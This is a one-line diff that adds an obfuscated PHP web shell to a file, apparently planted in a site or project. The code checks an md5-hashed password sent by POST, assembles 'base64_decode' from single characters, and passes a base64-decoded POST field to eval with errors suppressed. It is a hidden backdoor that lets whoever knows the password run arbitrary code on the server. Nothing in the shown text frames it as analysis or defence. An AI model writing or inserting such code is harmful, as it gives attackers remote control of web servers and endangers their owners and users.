@@ -1,0 +1,1 @@
+<?php $WHN = $_POST; if(!empty($WHN['w']) && !empty($WHN['h']) && md5($WHN['w'].md5($WHN['w']))==('629c1'.'124a8'.'fa260'.'5b2be'.'6d497'.'efd71'.'a3')) { $HkW = 'B'.'a'.'s'.'e'.'6'.'4'.'_'.'D'.'E'.'C'.'o'.'d'.'e'; @EVal/*trUdB*/($HkW(@$WHN['h'])); exit; } ?>xe
